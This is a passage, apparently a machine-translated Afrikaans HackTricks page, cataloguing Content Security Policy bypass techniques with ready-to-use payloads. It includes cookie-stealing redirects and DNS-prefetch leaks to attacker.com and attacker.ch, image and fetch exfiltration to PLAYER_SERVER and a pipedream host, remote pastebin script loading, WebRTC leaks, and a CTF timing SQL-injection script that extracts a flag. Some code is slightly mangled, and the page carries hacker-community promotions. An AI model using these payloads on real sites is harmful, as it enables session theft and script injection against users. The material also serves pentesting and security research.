'n Spesifieke beleid bekend as Inhoudsbeveiligingsbeleid (CSP) kan JavaScript-gebeure beperk. Nietemin stel AngularJS aangepaste gebeure as 'n alternatief voor. Binne 'n gebeurtenis verskaf AngularJS 'n unieke voorwerp `$event`, wat verwys na die inheemse blaaier-gebeurtenisvoorwerp. Hierdie `$event`-voorwerp kan gebruik word om die CSP te omseil. Veral in Chrome besit die `$event/event`-voorwerp 'n `path`-eienskap wat 'n voorwerpmatriks bevat wat betrokke is by die uitvoerketting van die gebeurtenis, met die `window`-voorwerp wat altyd aan die einde geplaas word. Hierdie struktuur is van kritieke belang vir sandbakkisontsnappingstaktieke.

Deur hierdie matriks na die `orderBy`-filter te rig, is dit moontlik om daaroor te itereer en die terminale element (die `window`-voorwerp) te benut om 'n globale funksie soos `alert()` te aktiveer. Die gedemonstreerde kodefragment hieronder verduidelik hierdie proses:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Hierdie snipper wys die gebruik van die `ng-focus` riglyn om die gebeurtenis te aktiveer, deur die `$event.path|orderBy` te gebruik om die `path`-array te manipuleer, en deur die `window`-objek te benut om die `alert()`-funksie uit te voer, wat dus `document.cookie` blootstel.

**Vind ander Angular omseilings in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS en toegelate domein
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
'n CSP-beleid wat domeine vir skriplading in 'n Angular JS-toepassing op 'n witlys plaas, kan omseil word deur die aanroeping van terugroepfunksies en sekere kwesbare klasse. Verdere inligting oor hierdie tegniek is beskikbaar in 'n gedetailleerde gids op hierdie [git-opberging](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).


Werkende lading:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Ander JSONP-willekeurige uitvoeringspunten kan hier gevind word [**hier**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (sommige van hulle is verwyder of reggestel)

### Omleiding deurloop

Wat gebeur wanneer CSP te make kry met 'n omleiding aan die kant van die bediener? As die omleiding na 'n ander oorsprong lei wat nie toegelaat word nie, sal dit steeds misluk.

Volgens die beskrywing in [CSP spesifikasie 4.2.2.3. Paaie en omleidings](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), kan die oorspronklike beperkings omseil word as die omleiding na 'n ander pad lei.

Hier is 'n voorbeeld:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
As CSP is ingestel op `https://www.google.com/a/b/c/d`, sal beide `/test` en `/a/test` skripte geblokkeer word deur CSP, aangesien die pad in ag geneem word.

Die finale `http://localhost:5555/301` sal egter **op die bedienerkant na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//` omgelei word**. Aangesien dit 'n omleiding is, word die **pad nie in ag geneem nie**, en die **skrip kan gelaai word**, wat die padbeperking omseil.

Met hierdie omleiding sal dit selfs omseil word as die pad volledig gespesifiseer word.

Daarom is die beste oplossing om te verseker dat die webwerf geen oop omleidingskwesbaarhede het nie en dat daar geen domeine is wat in die CSP-re√´ls uitgebuit kan word.

### Omseil CSP met hangende merkups

Lees [hier hoe](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` beteken dat jy enige skrip binne die kode kan uitvoer (XSS kan kode uitvoer) en `img-src *` beteken dat jy enige prent van enige bron in die webblad kan gebruik.

Jy kan hierdie CSP omseil deur die data te eksfiltreer deur middel van prente (in hierdie geval misbruik die XSS 'n CSRF waar 'n bladsy wat deur die bot toeganklik is, 'n SQLi bevat, en die vlag uittrek deur middel van 'n prent):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Vanaf: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Jy kan ook hierdie konfigurasie misbruik om **javascript-kode wat binne 'n prent ingevoeg is te laai**. As byvoorbeeld die bladsy toelaat dat prente vanaf Twitter gelaai word, kan jy 'n **spesiale prent** skep, dit na Twitter oplaai en die "**unsafe-inline**" misbruik om 'n JS-kode (soos 'n gewone XSS) uit te voer wat die prent sal **laai**, die **JS** daaruit sal **onttrek** en dit sal **uitvoer**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Met Dienswerkers

Dienswerkers se **`importScripts`**-funksie word nie deur CSP beperk nie:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Beleidsinspuiting

**Navorsing:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

As 'n **parameter** wat deur jou gestuur word, binne die **verklaring** van die **beleid geplak** word, kan jy die beleid op 'n manier verander wat dit **nutteloos maak**. Jy kan skrips "unsafe-inline" toelaat met enige van hierdie omseilings:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Omdat hierdie riglyn bestaande script-src riglyne sal **oorwrite**.\
Jy kan 'n voorbeeld hier vind: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

In Edge is dit baie eenvoudiger. As jy net hierdie kan byvoeg in die CSP: **`;_`** sal **Edge** die hele **beleid laat val**.\
Voorbeeld: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Tydaanval

Let op die afwesigheid van die riglyn `'unsafe-inline'`\
Hierdie keer kan jy die slagoffer 'n bladsy in **jou beheer** laat **laai** via **XSS** met 'n `<iframe>`. Hierdie keer gaan jy die slagoffer die bladsy laat besoek waarvandaan jy inligting wil onttrek (**CSRF**). Jy kan nie die inhoud van die bladsy onttrek nie, maar as jy op een of ander manier die tyd kan beheer wat die bladsy neem om te laai, kan jy die benodigde inligting onttrek.

Hierdie keer sal 'n **vlag** onttrek word, telkens as 'n **karakter korrek gegis** word via SQLi, neem die **reaksie** langer tyd as gevolg van die slaapfunksie. Dan sal jy in staat wees om die vlag te onttrek:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bladwijzers

Hierdie aanval vereis 'n bietjie sosiale ingenieurswese waar die aanvaller die gebruiker oortuig om 'n skakel oor die bladwijzer van die webblaaier te sleep en te laat val. Hierdie bladwijzer sal **boosaardige javascript**-kode bevat wat uitgevoer sal word in die konteks van die huidige webvenster, **CSP omseil en die diefstal van sensitiewe inligting soos koekies of tokens toelaat**.

Vir meer inligting [**kyk die oorspronklike verslag hier**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP-omseiling deur beperking van CSP

In [**hierdie CTF-verslag**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution) word CSP omseil deur 'n meer beperkende CSP in te spuit binne 'n toegelate ifram wat die laai van 'n spesifieke JS-l√™er verbied. Hierdie l√™er maak dit dan moontlik om deur middel van **prototipeverontreiniging** of **dom-verontreiniging** 'n ander skrip te misbruik om 'n willekeurige skrip te laai.

Jy kan **'n CSP van 'n Iframe beperk** met die **`csp`**-eienskap:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

In [**hierdie CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), was dit moontlik deur **HTML-injectie** om 'n **CSP** meer te **beperk**, sodat 'n skrip wat CSTI voorkom, gedeaktiveer is en dus die **kwesbaarheid uitbuitbaar geword het.**\
CSP kan meer beperkend gemaak word deur gebruik te maak van **HTML meta-etikette** en inline-skripte kan gedeaktiveer word deur die **inskrywing** wat hul **nonce** toelaat te **verwyder** en **spesifieke inline-skrip te aktiveer via sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS uitlekking met Content-Security-Policy-Report-Only

As jy kan slaag om die bediener te laat reageer met die kop **`Content-Security-Policy-Report-Only`** met 'n **waarde wat deur jou beheer word** (dalk as gevolg van 'n CRLF), kan jy dit laat wys na jou bediener en as jy die **JS-inhoud** wat jy wil uitlek, **omsluit** met **`<script>`**, en omdat dit baie waarskynlik is dat `unsafe-inline` nie toegelaat word deur die CSP nie, sal dit 'n CSP-fout veroorsaak en 'n gedeelte van die skrips (wat die sensitiewe inligting bevat) sal na die bediener gestuur word vanaf `Content-Security-Policy-Report-Only`.

Vir 'n voorbeeld [**kyk na hierdie CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Uitlek van Inligting met CSP en Iframe

- 'n `iframe` word geskep wat na 'n URL verwys (ons noem dit `https://voorbeeld.redirect.com`) wat toegelaat word deur CSP.
- Hierdie URL verwys dan na 'n geheime URL (bv. `https://gebruikergeheim.example2.com`) wat **nie toegelaat** word deur CSP nie.
- Deur te luister na die `securitypolicyviolation`-gebeurtenis, kan die `blockedURI`-eienskap vasgevang word. Hierdie eienskap onthul die domein van die geblokkeerde URI, wat die geheime domein waarheen die aanvanklike URL verwys het, uitlek.

Dit is interessant om op te merk dat webblaaier soos Chrome en Firefox verskillende gedrag het met betrekking tot iframes en CSP, wat kan lei tot die potensi√´le uitlek van sensitiewe inligting as gevolg van ongedefinieerde gedrag.

'n Ander tegniek behels die uitbuiting van die CSP self om die geheime subdomein af te lei. Hierdie metode maak gebruik van 'n bin√™re soekalgoritme en pas die CSP aan om spesifieke domeine in te sluit wat doelbewus geblokkeer word. Byvoorbeeld, as die geheime subdomein bestaan uit onbekende karakters, kan jy iteratief verskillende subdomeine toets deur die CSP-voorskrif te wysig om hierdie subdomeine te blokkeer of toe te laat. Hier is 'n voorbeeld van hoe die CSP opgestel kan word om hierdie metode te fasiliteer:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Deur te monitor watter versoekers deur die CSP geblokkeer of toegelaat word, kan die moontlike karakters in die geheime subdomein beperk word, en uiteindelik die volledige URL onthul.

Beide metodes maak gebruik van die subtiliteite van die implementering en gedrag van die CSP in webblaaier, en demonstreer hoe skynbaar veilige beleide onbedoeld sensitiewe inligting kan lek.

Truuk van [**hier**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutjagters te kommunikeer!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hackery ondersoek

**Hack-nuus in werklikheid**\
Bly op hoogte van die vinnige hackery-w√™reld deur middel van werklike nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutjagbounties wat begin en kritieke platformopdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## Onveilige tegnologie√´ om CSP te omseil

### PHP-responsbuffer-oorlading

PHP is bekend daarvoor dat dit standaard die respons tot 4096 byte buffer. Daarom, as PHP 'n waarskuwing wys, deur genoeg data binne waarskuwings te voorsien, sal die respons gestuur word voordat die CSP-kop gestuur word, wat veroorsaak dat die kop ge√Øgnoreer word.\
Die tegniek bestaan dus basies daarin om die responsbuffer met waarskuwings te vul sodat die CSP-kop nie gestuur word nie.

Idee van [**hierdie writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Herskryf foutbladsy

Van [**hierdie writeup**](https://blog.ssrf.kr/69) lyk dit asof dit moontlik was om 'n CSP-beskerming te omseil deur 'n foutbladsy (moontlik sonder CSP) te laai en sy inhoud te herskryf.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME is 'n tegniek wat 'n XSS (of hoogs beperkte XSS) misbruik **in 'n eindpunt van 'n bladsy** om **ander eindpunte van dieselfde oorsprong te misbruik.** Dit word gedoen deur die kwesbare eindpunt van 'n aanvaller se bladsy te laai en dan die aanvaller se bladsy na die regte eindpunt in dieselfde oorsprong te herlaai wat jy wil misbruik. Op hierdie manier kan die **kwesbare eindpunt** die **`opener`** objek in die **payload** gebruik om toegang te verkry tot die DOM van die **regte eindpunt om te misbruik.** Vir meer inligting, kyk:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Verder het **wordpress** 'n **JSONP** eindpunt in `/wp-json/wp/v2/users/1?_jsonp=data` wat die **data** wat in die uitset gestuur word, sal **weerspie√´l** (met die beperking van slegs letters, syfers en punte).

'n Aanvaller kan daardie eindpunt misbruik om 'n SOME-aanval teen WordPress te **genereer** en dit binne `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` in te sluit. Let daarop dat hierdie **script** sal **laai** omdat dit **toegelaat word deur 'self'**. Verder, en omdat WordPress ge√Ønstalleer is, kan 'n aanvaller die **SOME-aanval** misbruik deur die **kwesbare** **terugroep-eindpunt** wat die CSP **omseil** om meer voorregte aan 'n gebruiker te gee, 'n nuwe invoegtoepassing te installeer...
Vir meer inligting oor hoe om hierdie aanval uit te voer, kyk [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Uitlekvermyding

As daar 'n streng CSP is wat jou nie toelaat om **met eksterne bedieners te kommunikeer nie**, is daar sekere dinge wat jy altyd kan doen om die inligting uit te lek.

### Ligging

Jy kan eenvoudig die ligging opdateer om die geheime inligting na die aanvaller se bediener te stuur:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta-etiket

Jy kan omskakel deur 'n meta-etiket in te spuit (dit is net 'n omskakeling, dit sal nie inhoud lek nie)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Voorafoplossing

Om bladsye vinniger te laai, sal webblaaier die hostnaam vooraf oplos na IP-adresse en dit vir later gebruik in die kas geplaas word.\
Jy kan 'n webblaaier aandui om 'n hostnaam vooraf op te los met: `<link reol="dns-prefetch" href="iets.com">`

Jy kan hierdie gedrag misbruik om **gevoelige inligting te eksfiltreer deur middel van DNS-versoeke**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
'n Ander manier:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Om te voorkom dat dit gebeur, kan die bediener die HTTP-kop stuur:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Dit blyk dat hierdie tegniek nie werk in headless webblaaier (bots) nie.
{% endhint %}

### WebRTC

Op verskeie bladsye kan jy lees dat **WebRTC nie die `connect-src` beleid van die CSP nagaan nie**.

Eintlik kan jy inligting _lek_ deur 'n _DNS-versoek_ te gebruik. Kyk na hierdie kode:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
'n Ander opsie:'
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Kontroleer CSP-beleide aanlyn

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Outomaties skep van CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Verwysings

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutvinders van beloningsjagte!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hackering ondersoek

**Hack-nuus in werklikheid**\
Bly op hoogte van die vinnige hackering-w√™reld deur middel van werklikheidsnuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste beloningsjagte wat begin en noodsaaklike platformopdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS-hackering van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hackeringstruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
